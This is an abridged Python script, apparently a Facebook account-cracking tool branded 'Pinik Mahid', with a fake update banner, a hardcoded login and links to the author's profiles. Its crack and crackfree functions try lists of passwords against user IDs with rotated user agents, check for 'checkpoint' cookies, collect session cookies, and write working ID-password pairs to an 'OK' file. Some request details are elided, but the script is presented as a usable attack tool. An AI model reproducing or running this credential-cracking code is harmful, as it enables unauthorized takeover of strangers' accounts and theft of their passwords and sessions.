...
print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50mCHECKING UPDATE PINIK MAHID...? ')
os.system("espeak -a 300 \"Checking,Update,\"")
time.sleep(2)
#os.system('clear')
print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 99.99...! ')
os.system("espeak -a 300 \"UPDATE VERSION 99.99,\"")
time.sleep(2)
#os.system('clear')
...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/pinik.mahid.001')
os.system(f'xdg-open https://www.facebook.com/pinik.mahid.001')
...
while attemps < 12345677901:
    ...
    if username == 'pinik' and password == 'mahid':
...
def menu():
    ...
    if HEART in ['111']:
        ...
        os.system('xdg-open https://github.com/PinikMahid')
        os.system("python nono.py")
    elif HEART in ['3','03']:
        result()
    elif HEART in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://mbasic.facebook.com/profile.php?id=100073213626571")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;95m{bo}[Pinik 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[Pinik-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Pinik 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•PINIK-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
